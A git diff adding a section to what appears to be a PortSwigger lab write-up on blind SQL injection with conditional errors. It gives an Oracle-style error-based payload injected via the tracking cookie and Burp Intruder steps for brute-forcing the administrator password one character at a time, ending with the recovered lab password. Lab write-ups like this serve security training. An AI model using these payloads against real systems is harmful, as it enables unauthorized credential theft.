@@ -109,3 +109,32 @@ From line  20, we are not  getting  an error where condition is *(LENGTH > 20)*.
 ![Screenshot 2024-02-04 212405](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4e5bb4c7-12a9-479b-8197-71eff7277f53)
 
 Password length  is  **20** characters long.
+
+#### Finding the  20 characters length password by Brute force -
+
+
+```sql
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND  SUBSTR(password,1,1)='a') ||'
+```
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f8c9435c-4342-4f0f-b277-589f73082569)
+
+->a is not the first character of the password.
+
+```To find the first character of the password send qury to  Intruder then and Add the string part as payload and select attack type as SNIPER .Then go to  payload sleect payload type as bruteforce set min and max =1  and start the attack ```
+
+```sql
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND  SUBSTR(password,1,1)='$a$') ||'
+```
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c375b8ff-289f-4be5-8881-f91e9e221ece)
+
+Find 500 response code to find the first charactor of the password.
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/67c93c82-c394-4bd1-984b-aa1c7ebb60a8)
+
+we will able get the first character of the password that is  ```q```
+
+Similarly we will find all the characters.So the password is ```qii57qhxt8oox3ezd9ot```
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/21e2f840-dc21-4b4f-b21b-cbd49f11d676)
